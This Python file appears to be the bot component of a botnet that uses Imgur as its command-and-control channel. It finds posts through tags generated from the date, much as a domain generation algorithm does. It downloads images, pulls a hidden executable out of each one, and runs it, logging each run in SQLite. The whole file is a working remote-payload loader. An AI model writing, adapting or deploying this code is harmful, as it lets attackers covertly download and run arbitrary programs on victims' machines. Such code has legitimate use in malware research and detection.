import requests
import json
import os
import subprocess
import sqlite3 as sl
from datetime import datetime
from imgur_c2.auth import client_id
from imgur_c2.tng import generate_tag_name
from imgur_c2.ImgMsg import ImgMsg, imgMsgFromFile, imgMsgFromImage


# Bots find C2 by searching Imgur for special tags, generated based on
# current utc time. This is similar to domain name generation botnets use.
TODAYS_TAG = generate_tag_name(datetime.utcnow())
SQLITE_PATH = os.path.join(os.path.dirname(__file__), "imgur-history.db")
CON = None


def init_db(db_path=SQLITE_PATH):
    global CON
    CON = sl.connect(db_path)

    with CON:
        cur = CON.cursor()
        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS IMGUR_HISTORY (
                id INTEGER PRIMARY KEY,
                imgur_id TEXT,
                last_exec TEXT
            );
            """
        )


def get_images_by_tag(tag):
    url = (
        "https://api.imgur.com/post/v1/posts/t/"
        + tag
        + "?client_id="
        + client_id
        + "&filter%5Bwindow%5D=week&include=adtiles%2Cadconfig%2Ccover&page=1&sort=-viral"
    )
    res = requests.get(url).content
    data = json.loads(res)
    images = []

    if "errors" in data:
        print("Errors:", data["errors"])
    elif "posts" in data:
        # print(json.dumps(data["posts"], indent=2))
        for i in data["posts"]:
            images.append(i["cover"]["id"])
    else:
        print("Unknown Error:", data)

    return images


def in_history(imgur_id):
    global CON
    if CON is None:
        init_db()

    with CON:
        cur = CON.cursor()
        sql = "SELECT * FROM IMGUR_HISTORY WHERE imgur_id=?;"
        cur.execute(sql, (imgur_id,))
        return cur.fetchone() or False


def execute(imgur_id):
    global CON
    if CON is None:
        init_db()

    # download an image w/ ID use https://imgur.com/download/{imgur_id}
    url = "https://imgur.com/download/{}".format(imgur_id)
    image_file = imgur_id + ".png"
    r = requests.get(url, allow_redirects=True)

    with open(image_file, "wb") as fd_out:
        fd_out.write(r.content)

    # convert image to binary w/ ImgMsg module
    save_file = imgur_id + ".exe"
    imgmsg = imgMsgFromImage(image_file)
    imgmsg.exportMsgToFile(save_file)

    # execution
    subprocess.call([save_file])

    # if successfully executed
    with CON:
        cur = CON.cursor()
        sql = "INSERT INTO IMGUR_HISTORY (imgur_id, last_exec) VALUES (?, datetime('now'));"
        ret = cur.execute(sql, (imgur_id,))
        return ret.lastrowid or False


def main():
    exec_count = 0
    images = get_images_by_tag(TODAYS_TAG)

    for imgur_id in images:
        if not in_history(imgur_id):
            print("Executing image", imgur_id)
            execute(imgur_id)
            exec_count += 1

    print(
        "Execute {} out of {} images found in tag {} gallery ({})".format(
            exec_count, len(images), TODAYS_TAG, "https://imgur.com/t/" + TODAYS_TAG
        )
    )


if __name__ == "__main__":
    main()
